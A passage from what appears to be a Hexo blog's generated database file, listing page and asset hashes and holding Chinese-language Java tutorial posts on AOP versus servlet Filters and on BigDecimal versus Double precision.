14daee06f4","modified":1543103762667},{"_id":"public/2018/02/01/Java面试知识点总结/index.html","hash":"680972f0317a84525a6f09a36a7d153d94f6e5aa","modified":1543103762667},{"_id":"public/2018/01/31/SpringBoot入门/index.html","hash":"7aa2789ec13e8f1c6ef8eadcad74c9ca12e62e15","modified":1543103762667},{"_id":"public/2018/01/31/List集合切割的工具类/index.html","hash":"654695fd1424d71afddebe70d2b44adcfdf4b258","modified":1543103762667},{"_id":"public/2018/01/31/MySql数据库的事务/index.html","hash":"86e117e9660ebe48b3c17670284913a39a0afe9f","modified":1543103762667},{"_id":"public/2018/01/31/Java多线程/index.html","hash":"a2fe6c425099a68a3479b169bdbea4b98b5dacc6","modified":1543103762667},{"_id":"public/2018/01/31/JS基础知识点/index.html","hash":"b3b7772a3e5c1eeca123e61c5b7f799064b613d5","modified":1543103762667},{"_id":"public/2018/01/30/Tomcat端口配置及原理详解/index.html","hash":"212a62648642f6b742304bce5a7c7ac0bf6f007a","modified":1543103762667},{"_id":"public/2018/01/30/tomcat中的三个端口的含义/index.html","hash":"104ee79d700a82ceba05c7cd5695b5612c95b72c","modified":1543103762667},{"_id":"public/2018/01/30/ifconfig、ifup、ifdown的用法/index.html","hash":"f96939ea80ed17ba08d2728c6a6a938fbd322d9f","modified":1543103762668},{"_id":"public/2018/01/30/Aop和filter的关系/index.html","hash":"84c3ddbf74c84ce5f447d4309e98c7328706917f","modified":1543103762668},{"_id":"public/2018/01/18/利用JDK和spring-task实现高可用定时任务/index.html","hash":"31535ee678a30e059c2cf81042f93ba90df4d909","modified":1543103762668},{"_id":"public/2018/01/03/springboot集成swagger注解入门/index.html","hash":"d9f4c5be00a1bde16a67a5729ef83c2e68e78fb5","modified":1543103762668},{"_id":"public/2017/12/31/Nginx简介/index.html","hash":"95673854bbe611fe94429df3c1dfc34b6119b6bf","modified":1543103762668},{"_id":"public/2017/12/31/Kotlin基础语法/index.html","hash":"a61fc5daa1c4b35bffafe72ae67f976b0fcd7607","modified":1543103762668},{"_id":"public/2017/12/30/MySql触发器/index.html","hash":"5c52c1b1247d1e41614bba71fd4eb003a5ec187a","modified":1543103762668},{"_id":"public/2017/12/29/DOS批处理入门/index.html","hash":"dbc075631b8f7ed972b74568f59745924bca5cd4","modified":1543103762668},{"_id":"public/2017/12/29/方法的重载和重写/index.html","hash":"031f1b2f7941b7b6124845c4408faa3828581bcb","modified":1543103762668},{"_id":"public/2017/12/29/有什么区别/index.html","hash":"047c89d7cec748a210bc9a670bd422b9ffeed728","modified":1543103762668},{"_id":"public/2017/12/29/DOS命令大全/index.html","hash":"07cb4c5a3d14f7955dbda6f2aa819ecb0db74416","modified":1543103762668},{"_id":"public/2017/12/19/MySql存储函数入门教程/index.html","hash":"e4d99e4284ac6d0d3d395b8ec22009e97b64e7ab","modified":1543103762668},{"_id":"public/2017/12/11/Springmvc面试总结/index.html","hash":"e72e9398b4fc7747da8d6e5f6d65a1981b993c32","modified":1543103762668},{"_id":"public/2017/11/30/Zookeeper的领导者选举和原子广播/index.html","hash":"6cde3018a5174c13279de26369a33446f8c68549","modified":1543103762668},{"_id":"public/2017/11/01/JavaEE开发中的几种对象模型/index.html","hash":"c62b690ce0a61e993623c7ef20e4468111176500","modified":1543103762668},{"_id":"public/2017/09/22/MySql优化/index.html","hash":"35759030a75164f449007f1452edff273c075f97","modified":1543103762668},{"_id":"public/2017/09/18/Struts2面试总结/index.html","hash":"e349e56c890cb61904569b9b40a7f7300ab99782","modified":1543103762669},{"_id":"public/2017/09/13/MySql系统架构简介/index.html","hash":"b84c7284fc0cd0826b61fec270e701369419d9f3","modified":1543103762669},{"_id":"public/2017/09/08/MySQL存储过程入门教程/index.html","hash":"371038b22e849d3c8e0f0417b1c626f3d4b810d5","modified":1543103762669},{"_id":"public/2017/04/23/Spring面试总结/index.html","hash":"224aacd084c4325db861c6989aac6b19477a1723","modified":1543103762669},{"_id":"public/2017/03/31/Mybatis面试总结/index.html","hash":"00a40379cea5ac51204cff345c4172376aa3f446","modified":1543103762669},{"_id":"public/2017/03/30/Mybatis和IBatis的区别/index.html","hash":"28562660e5844eba2cdc6ef52c8f6e07651a0e13","modified":1543103762669},{"_id":"public/2017/02/22/CGLIB动态代理/index.html","hash":"3f9a950352af68c2f3546c81bd15741aec50e970","modified":1543103762669},{"_id":"public/2017/01/31/Tomcat优化/index.html","hash":"387cb577524af261106236667eecc7bf730941ff","modified":1543103762669},{"_id":"public/2017/01/01/maven常见问题/index.html","hash":"a78b9b46a3a49399bfccc49c25b5130748df9ed0","modified":1543103762669},{"_id":"public/2016/12/31/GIT原理/index.html","hash":"441c56cca25e3bc5508ea30b9e6063afe1a93aee","modified":1543103762669},{"_id":"public/2016/12/29/集合框架体系图/index.html","hash":"f22f6c0a195d6b74d2e9c1cce6927b2e9eefaf45","modified":1543103762669},{"_id":"public/2016/12/01/ClassLoader类加载器/index.html","hash":"614990a5437cc29a358074421fae91303028177d","modified":1543103762669},{"_id":"public/2016/08/11/MongoDB、Redis和Hbase的区别/index.html","hash":"0dfed8deb71050fe4cd8eaa456c2a1f429cabf70","modified":1543103762669},{"_id":"public/2016/07/30/常用命令速查表/index.html","hash":"3c7ab64010c4f3a9077378fec8dc908427dcb68e","modified":1543103762669},{"_id":"public/2016/04/12/XML解析思路/index.html","hash":"1b2e0b7f1edd784c84f86356e0e805bc50045044","modified":1543103762669},{"_id":"public/2016/03/23/动态代理的两种实现/index.html","hash":"97e1030908ccd667f060eaa5767c8251948cbe5b","modified":1543103762669},{"_id":"public/2016/02/28/Join查询/index.html","hash":"9d5d11ab924314eac6f02e9376c27feb8d07b18f","modified":1543103762669},{"_id":"public/2016/02/22/JDK动态代理/index.html","hash":"55260354e830d9727d207cd56e1cb7b66947c9b4","modified":1543103762670},{"_id":"public/2016/01/31/NoSql数据库Redis/index.html","hash":"970808f3fc76fa215a695dbb7a732e1d42357c05","modified":1543103762670},{"_id":"public/2015/11/13/Interceptor和Filter/index.html","hash":"9748fbc80d673b58faeeb978e8dd098f1c878eb8","modified":1543103762670},{"_id":"public/2015/07/30/welcome-file-list元素/index.html","hash":"63a499d9ad63122e24bc3641bd2cccae33baf91a","modified":1543103762670},{"_id":"public/2015/06/12/死锁/index.html","hash":"2b8804cbc0f5d9ab7860f807a1b59277db1efa94","modified":1543103762670},{"_id":"public/2015/05/31/JQuery基础知识/index.html","hash":"3ee86ec3eb750bc1b5443aaeb1266928ac55a4c4","modified":1543103762670},{"_id":"public/2015/04/29/阿里巴巴Rpc框架Dubble/index.html","hash":"9ce969459e07cdd32e8443fd45c3e44611b4311f","modified":1543103762670},{"_id":"public/2014/12/21/Servlet总结/index.html","hash":"2063e79b4532fcd2f57ae3cb2098f81b0f52b7f5","modified":1543103762670},{"_id":"public/2014/12/13/大数据类型BigDecimal与Double/index.html","hash":"f5d7a7d002df442349a67b9be828e580772e3ef7","modified":1543103762670},{"_id":"public/2014/11/22/hashmap数据结构/index.html","hash":"4b7cfaee1c7ebb814766b0708772a638f051110c","modified":1543103762670},{"_id":"public/2014/11/02/Cookie和Session/index.html","hash":"83237b60e60a43d4779fe8b85dc6f95b94136c14","modified":1543103762670},{"_id":"public/2014/08/04/和equals的区别/index.html","hash":"b3ad5966d323f363ffbf5e250ef887dc2aa1d989","modified":1543103762670},{"_id":"public/2014/04/21/JSP的静态包含与动态包含/index.html","hash":"e886a270bc473287e63d85cad62eb93625f136df","modified":1543103762670},{"_id":"public/2014/03/23/BigDecimal与Double/index.html","hash":"c3fb5ef0618e93636983a2dd627e25f44885279c","modified":1543103762670},{"_id":"public/2014/03/22/数组注意事项/index.html","hash":"96665c96be6126af39fffadeec7b6a723fa43246","modified":1543103762670},{"_id":"public/archives/index.html","hash":"41372f19ff0150edd9014769cec41759e5de395a","modified":1543103762670},{"_id":"public/archives/page/2/index.html","hash":"b58c6ddb1d1da76e29bb98b8cdf97554c13b14e6","modified":1543103762671},{"_id":"public/archives/page/3/index.html","hash":"7808e8dd05d2c684dd19243bf01077a2ae3ef757","modified":1543103762671},{"_id":"public/archives/page/4/index.html","hash":"664d32b9971613167cb9e6347951eff38cf2fabf","modified":1543103762671},{"_id":"public/archives/2014/index.html","hash":"57ec63e7d8c39a6f91586943e0d49af99130750c","modified":1543103762671},{"_id":"public/archives/2015/index.html","hash":"638dd73f7fbdbbb0280d54245587b2d5a0a0a116","modified":1543103762671},{"_id":"public/archives/2016/index.html","hash":"14c4b7eaf460eb3f44b9a4e3afe5f27c15e4144c","modified":1543103762671},{"_id":"public/archives/2017/index.html","hash":"b1b06f24c6b3ed0d9bec37721d8e9c92502d6730","modified":1543103762671},{"_id":"public/archives/2017/page/2/index.html","hash":"26616bf086c0218492d8eb05891d594f3686e801","modified":1543103762671},{"_id":"public/archives/2017/12/index.html","hash":"54e47459935ebb8320b61ac0caf870d386d9d25b","modified":1543103762671},{"_id":"public/archives/2018/index.html","hash":"7c1640f263ee0d7ba997136604475f8f781bd1b7","modified":1543103762671},{"_id":"public/archives/2018/01/index.html","hash":"00e9d6b6a77b23e2bab9b50e12faf0358abf8934","modified":1543103762671},{"_id":"public/page/2/index.html","hash":"de2d080c7e263427026dcc23474bee55a493f0eb","modified":1543103762671},{"_id":"public/page/3/index.html","hash":"813242d246c389515e7a3b07447d24d2d046c15c","modified":1543103762671},{"_id":"public/index.html","hash":"ab92883dbc46265ae7082c86f6a97acfb193cef5","modified":1543103762671},{"_id":"public/page/4/index.html","hash":"5bfc0e84617612861f3c3ac4c7fdabcf07155c4b","modified":1543103762671},{"_id":"public/page/5/index.html","hash":"fadb3b9caad8549299b2ed697e1cd86125bdf704","modified":1543103762671},{"_id":"public/page/6/index.html","hash":"6c5bf1825a96fb678e72550c552d8cc8c6d451cb","modified":1543103762672},{"_id":"public/page/7/index.html","hash":"6c2b1b63cf759fce46d49e6427c7eef22c39a05c","modified":1543103762672},{"_id":"public/tags/JavaSE/index.html","hash":"dd407eac028868cba72562da0353a3013cd0704e","modified":1543103762672},{"_id":"public/tags/JavaEE/index.html","hash":"c08014468acb758be5fa929f837536a9b38272d0","modified":1543103762672},{"_id":"public/tags/MySql/index.html","hash":"08fb408bf80aa5e19e061a3685108c2d5252e17c","modified":1543103762672},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1543103762680},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1543103762680},{"_id":"public/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1543103762680},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1543103762680},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1543103762680},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1543103762680},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1543103762680},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1543103762680},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1543103762680},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1543103762681},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1543103762681},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1543103762681},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1543103762681},{"_id":"public/images/logo.svg","hash":"d29cacbae1bdc4bbccb542107ee0524fe55ad6de","modified":1543103762681},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1543103762681},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1543103762681},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1543103762681},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1543103762681},{"_id":"public/lib/font-awesome/HELP-US-OUT.txt","hash":"4f7bf961f1bed448f6ba99aeb9219fabf930ba96","modified":1543103762681},{"_id":"public/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1543103762681},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1543103763124},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1543103763126},{"_id":"public/js/src/algolia-search.js","hash":"1f7f10c579e7703d0f6acb8b73f3d78a07d0c623","modified":1543103763171},{"_id":"public/js/src/affix.js","hash":"a2aab233d99297435a5274bf512c3c753fe08e80","modified":1543103763171},{"_id":"public/js/src/bootstrap.js","hash":"1c41508b83cb0c4512e64b4d63afa1be954ce8ef","modified":1543103763172},{"_id":"public/js/src/exturl.js","hash":"54825acc8de4793feac415be227b965428f4e97d","modified":1543103763172},{"_id":"public/js/src/motion.js","hash":"b45d2c0d48f2c8e6a0621b8063845f76b89476cc","modified":1543103763172},{"_id":"public/js/src/js.cookie.js","hash":"9b37973a90fd50e71ea91682265715e45ae82c75","modified":1543103763172},{"_id":"public/js/src/post-details.js","hash":"0dde5e6d4547587662a3256317a9d5d1db507692","modified":1543103763172},{"_id":"public/js/src/scroll-cookie.js","hash":"d07b3776708d4ae79ed2037c4c7391d5c9b06b19","modified":1543103763172},{"_id":"public/js/src/scrollspy.js","hash":"fa3c92968bcdbcb8d95a1729f7659d9753cbd077","modified":1543103763172},{"_id":"public/js/src/utils.js","hash":"28a79d317b7f4012917a54cac770551596bf6241","modified":1543103763172},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1543103763172},{"_id":"public/js/src/schemes/pisces.js","hash":"72037e8c4202a73b0c6ff7d81b57cd349e836837","modified":1543103763172},{"_id":"public/lib/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1543103763172},{"_id":"public/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1543103763172},{"_id":"public/lib/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1543103763172},{"_id":"public/css/main.css","hash":"8f88d741de385d040305d9f71bc6d6ce3046992b","modified":1543103763172},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1543103763172},{"_id":"public/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1543103763173},{"_id":"public/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1543103763173},{"_id":"public/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1543103763173},{"_id":"public/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1543103763173},{"_id":"public/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1543103763173},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1543103763173},{"_id":"public/uploads/avatar.jpeg","hash":"fd839206d0059c2424dce3fa6d1db60207d7b9b9","modified":1543103763182}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Activiti工作流","date":"2016-01-30T07:27:34.000Z","_content":"![Activiti](Activiti工作流/1.png)","source":"_posts/Activiti工作流.md","raw":"---\ntitle: Activiti工作流\ndate: 2016-01-30 15:27:34\ntags: WorkFlow\n---\n![Activiti](Activiti工作流/1.png)","slug":"Activiti工作流","published":1,"updated":"2018-01-31T06:35:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvd0000mfahtn9wwrmu","content":"<p><img src=\"Activiti工作流/1.png\" alt=\"Activiti\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Activiti工作流/1.png\" alt=\"Activiti\"></p>\n"},{"title":"AOP和filter的关系","date":"2018-01-30T08:26:04.000Z","_content":"\n**AOP**（Aspect-Oriented Programming，面向切面编程）是一种编程思想，并不是一种具体的实现，谈到实现一般有Filter和代理模式两种常见的使用方式。\n\nSpring中的AOP也是封装代理模式完成的，可以说是**OOP**（Object-Oriented Programing，面向对象编程）的补充和完善。OOP利用封装、继承和多态把一切事物打造成对象结构，但是对于所有对象中都存在的一些公共行为，OOP就显得无能为力，也就是说OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。抽象和接口虽好，但对所有不相干的对象建立共同的接口或父类未免有些生硬，例如日志功能，日志代码几乎散布在所有的对象层次中，而它和散布到对象的核心功能毫无关系，对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。因此，为减少这种大量的重复代码，面向切面技术诞生了，AOP和OOP的关系好似JSP和Servlet的关系，以此之长，补彼之短。\n\n![Aop and Filter](Aop和filter的关系/142.png)\n\n**Java**中常见的AOP技术有两个，分别是Filter和代理模式（也可以称为过滤器和拦截器），Filter是基于回调函数，代理模式是基于Java反射技术，代理模式又分为静态代理和动态代理，动态代理就是拦截器的简单实现。他们各自实现的功能不同，原理如出一辙。如上图，以添加用户为例，采用Module1架构模式，从图中可以看出无论程序从左向右或者从右向左执行都必须经过Filter，Filter在Request到达JSP（Servlet）前截获Request并进行预处理，也可以在Response离开JSP（Servlet）时处理Response，然后对Request进行统一的设置后继续向后传递，比如可以在Filter完成字符集的设置，用户身份的识别，敏感词汇的过滤等等，配置Filter个数不限。\n\n**Filter**是职责链模式的经典应用，从上面示例代码可以看出，实现了Filter接口的doFilter方法主要用于截获Request对象，把截获的请求处理后（设置字符集），调用FilterChain 接口的chain.doFilter(request,response)方法，把处理权传递给下一个filter。\n\n其中，FilterChain维护了一个链表，链表中存放着配置对象的链条，每次用户调用 一次chain.doFilter(request, response)，链表就去取下一个配置对象，再通过配置对象 得到下一个filter，然后调用该filter，接着在filter里写的逻辑就被执行了。","source":"_posts/Aop和filter的关系.md","raw":"---\ntitle: AOP和filter的关系\ndate: 2018-01-30 16:26:04\ntags: AOP\n---\n\n**AOP**（Aspect-Oriented Programming，面向切面编程）是一种编程思想，并不是一种具体的实现，谈到实现一般有Filter和代理模式两种常见的使用方式。\n\nSpring中的AOP也是封装代理模式完成的，可以说是**OOP**（Object-Oriented Programing，面向对象编程）的补充和完善。OOP利用封装、继承和多态把一切事物打造成对象结构，但是对于所有对象中都存在的一些公共行为，OOP就显得无能为力，也就是说OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。抽象和接口虽好，但对所有不相干的对象建立共同的接口或父类未免有些生硬，例如日志功能，日志代码几乎散布在所有的对象层次中，而它和散布到对象的核心功能毫无关系，对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。因此，为减少这种大量的重复代码，面向切面技术诞生了，AOP和OOP的关系好似JSP和Servlet的关系，以此之长，补彼之短。\n\n![Aop and Filter](Aop和filter的关系/142.png)\n\n**Java**中常见的AOP技术有两个，分别是Filter和代理模式（也可以称为过滤器和拦截器），Filter是基于回调函数，代理模式是基于Java反射技术，代理模式又分为静态代理和动态代理，动态代理就是拦截器的简单实现。他们各自实现的功能不同，原理如出一辙。如上图，以添加用户为例，采用Module1架构模式，从图中可以看出无论程序从左向右或者从右向左执行都必须经过Filter，Filter在Request到达JSP（Servlet）前截获Request并进行预处理，也可以在Response离开JSP（Servlet）时处理Response，然后对Request进行统一的设置后继续向后传递，比如可以在Filter完成字符集的设置，用户身份的识别，敏感词汇的过滤等等，配置Filter个数不限。\n\n**Filter**是职责链模式的经典应用，从上面示例代码可以看出，实现了Filter接口的doFilter方法主要用于截获Request对象，把截获的请求处理后（设置字符集），调用FilterChain 接口的chain.doFilter(request,response)方法，把处理权传递给下一个filter。\n\n其中，FilterChain维护了一个链表，链表中存放着配置对象的链条，每次用户调用 一次chain.doFilter(request, response)，链表就去取下一个配置对象，再通过配置对象 得到下一个filter，然后调用该filter，接着在filter里写的逻辑就被执行了。","slug":"Aop和filter的关系","published":1,"updated":"2018-01-30T08:35:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvh0001mfahw30i7boz","content":"<p><strong>AOP</strong>（Aspect-Oriented Programming，面向切面编程）是一种编程思想，并不是一种具体的实现，谈到实现一般有Filter和代理模式两种常见的使用方式。</p>\n<p>Spring中的AOP也是封装代理模式完成的，可以说是<strong>OOP</strong>（Object-Oriented Programing，面向对象编程）的补充和完善。OOP利用封装、继承和多态把一切事物打造成对象结构，但是对于所有对象中都存在的一些公共行为，OOP就显得无能为力，也就是说OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。抽象和接口虽好，但对所有不相干的对象建立共同的接口或父类未免有些生硬，例如日志功能，日志代码几乎散布在所有的对象层次中，而它和散布到对象的核心功能毫无关系，对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。因此，为减少这种大量的重复代码，面向切面技术诞生了，AOP和OOP的关系好似JSP和Servlet的关系，以此之长，补彼之短。</p>\n<p><img src=\"Aop和filter的关系/142.png\" alt=\"Aop and Filter\"></p>\n<p><strong>Java</strong>中常见的AOP技术有两个，分别是Filter和代理模式（也可以称为过滤器和拦截器），Filter是基于回调函数，代理模式是基于Java反射技术，代理模式又分为静态代理和动态代理，动态代理就是拦截器的简单实现。他们各自实现的功能不同，原理如出一辙。如上图，以添加用户为例，采用Module1架构模式，从图中可以看出无论程序从左向右或者从右向左执行都必须经过Filter，Filter在Request到达JSP（Servlet）前截获Request并进行预处理，也可以在Response离开JSP（Servlet）时处理Response，然后对Request进行统一的设置后继续向后传递，比如可以在Filter完成字符集的设置，用户身份的识别，敏感词汇的过滤等等，配置Filter个数不限。</p>\n<p><strong>Filter</strong>是职责链模式的经典应用，从上面示例代码可以看出，实现了Filter接口的doFilter方法主要用于截获Request对象，把截获的请求处理后（设置字符集），调用FilterChain 接口的chain.doFilter(request,response)方法，把处理权传递给下一个filter。</p>\n<p>其中，FilterChain维护了一个链表，链表中存放着配置对象的链条，每次用户调用 一次chain.doFilter(request, response)，链表就去取下一个配置对象，再通过配置对象 得到下一个filter，然后调用该filter，接着在filter里写的逻辑就被执行了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>AOP</strong>（Aspect-Oriented Programming，面向切面编程）是一种编程思想，并不是一种具体的实现，谈到实现一般有Filter和代理模式两种常见的使用方式。</p>\n<p>Spring中的AOP也是封装代理模式完成的，可以说是<strong>OOP</strong>（Object-Oriented Programing，面向对象编程）的补充和完善。OOP利用封装、继承和多态把一切事物打造成对象结构，但是对于所有对象中都存在的一些公共行为，OOP就显得无能为力，也就是说OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。抽象和接口虽好，但对所有不相干的对象建立共同的接口或父类未免有些生硬，例如日志功能，日志代码几乎散布在所有的对象层次中，而它和散布到对象的核心功能毫无关系，对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。因此，为减少这种大量的重复代码，面向切面技术诞生了，AOP和OOP的关系好似JSP和Servlet的关系，以此之长，补彼之短。</p>\n<p><img src=\"Aop和filter的关系/142.png\" alt=\"Aop and Filter\"></p>\n<p><strong>Java</strong>中常见的AOP技术有两个，分别是Filter和代理模式（也可以称为过滤器和拦截器），Filter是基于回调函数，代理模式是基于Java反射技术，代理模式又分为静态代理和动态代理，动态代理就是拦截器的简单实现。他们各自实现的功能不同，原理如出一辙。如上图，以添加用户为例，采用Module1架构模式，从图中可以看出无论程序从左向右或者从右向左执行都必须经过Filter，Filter在Request到达JSP（Servlet）前截获Request并进行预处理，也可以在Response离开JSP（Servlet）时处理Response，然后对Request进行统一的设置后继续向后传递，比如可以在Filter完成字符集的设置，用户身份的识别，敏感词汇的过滤等等，配置Filter个数不限。</p>\n<p><strong>Filter</strong>是职责链模式的经典应用，从上面示例代码可以看出，实现了Filter接口的doFilter方法主要用于截获Request对象，把截获的请求处理后（设置字符集），调用FilterChain 接口的chain.doFilter(request,response)方法，把处理权传递给下一个filter。</p>\n<p>其中，FilterChain维护了一个链表，链表中存放着配置对象的链条，每次用户调用 一次chain.doFilter(request, response)，链表就去取下一个配置对象，再通过配置对象 得到下一个filter，然后调用该filter，接着在filter里写的逻辑就被执行了。</p>\n"},{"title":"BigDecimal与Double","date":"2014-03-23T15:01:29.000Z","_content":"### 大数据类型BigDecimal与Double\n\t\n\t我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\n\tBigDecimal与Double的实验分别采用两种方式计算两个小数的加法运算:\n  \n```java \npublic static void testNaN() {\n\tint num1 = 10;\n\tfloat num2 = 10.1F;\n\tdouble num3 = 10.2;\n\t\n\tBigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n\tBigDecimal add2 = new BigDecimal(\"10.1\").add(new BigDecimal(\"10.2\"));\n\tBigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n\tDouble add4 = num3 + num2;\n\tSystem.out.println(add1 + \"****\" + add2 + \"****\" + add3 + \"****\" + add4);\n}```\n\n执行结果\n20.3****20.3****20.300000381469727****20.300000381469726\n\n### 得出结论\n\t浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n### 使用心得\n\t我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n### API的使用\n\tadd(other) — 和\n\tsubtract(other) — 差\n\tmultiply(other) — 积\n\tdivid(other) — 商\n\tmod(oher) — 余\n\tint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数\n\tvalueOf(other) — 将基数值转换为大数据类型\n","source":"_posts/BigDecimal与Double.md","raw":"---\ntitle: BigDecimal与Double\ndate: 2014-03-23 23:01:29\ntags: JavaSE\n---\n### 大数据类型BigDecimal与Double\n\t\n\t我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\n\tBigDecimal与Double的实验分别采用两种方式计算两个小数的加法运算:\n  \n```java \npublic static void testNaN() {\n\tint num1 = 10;\n\tfloat num2 = 10.1F;\n\tdouble num3 = 10.2;\n\t\n\tBigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n\tBigDecimal add2 = new BigDecimal(\"10.1\").add(new BigDecimal(\"10.2\"));\n\tBigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n\tDouble add4 = num3 + num2;\n\tSystem.out.println(add1 + \"****\" + add2 + \"****\" + add3 + \"****\" + add4);\n}```\n\n执行结果\n20.3****20.3****20.300000381469727****20.300000381469726\n\n### 得出结论\n\t浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n### 使用心得\n\t我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n### API的使用\n\tadd(other) — 和\n\tsubtract(other) — 差\n\tmultiply(other) — 积\n\tdivid(other) — 商\n\tmod(oher) — 余\n\tint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数\n\tvalueOf(other) — 将基数值转换为大数据类型\n","slug":"BigDecimal与Double","published":1,"updated":"2017-12-29T15:10:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvk0003mfahsn712xgk","content":"<h3 id=\"大数据类型BigDecimal与Double\"><a href=\"#大数据类型BigDecimal与Double\" class=\"headerlink\" title=\"大数据类型BigDecimal与Double\"></a>大数据类型BigDecimal与Double</h3><pre><code>我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\nBigDecimal与Double的实验分别采用两种方式计算两个小数的加法运算:\n</code></pre><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">testNaN</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num1 = <span class=\"number\">10</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">float</span> num2 = <span class=\"number\">10.1F</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> num3 = <span class=\"number\">10.2</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tBigDecimal add1 = BigDecimal.valueOf(<span class=\"number\">10.1</span>).add(BigDecimal.valueOf(<span 